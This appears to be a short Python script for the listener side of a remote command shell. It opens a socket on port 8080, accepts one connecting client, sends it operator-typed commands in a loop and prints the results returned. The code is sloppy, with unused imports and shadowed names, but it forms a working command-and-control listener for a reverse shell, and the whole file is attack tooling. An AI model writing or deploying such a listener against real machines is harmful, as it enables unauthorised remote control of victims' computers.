from http import client, server
from ipaddress import ip_address
import subprocess
import socket

from click import command

ip_address='127.0.0.1'
port=8080
server=socket.socket()
server.bind((ip_address,port))
print("[+]server started")
print("listeninf for client connction...")
server.listen(1)
client,client_add=server.accept()
print(f'[+]{client_add} connected succefully')

while True:
    command=input('Enter Command: ')
    command=command.encode()
    client.send(command)
    print("[+] command sent")
    output=client.recv(1024)
    output=output.decode()
    print(f"Output: {output}")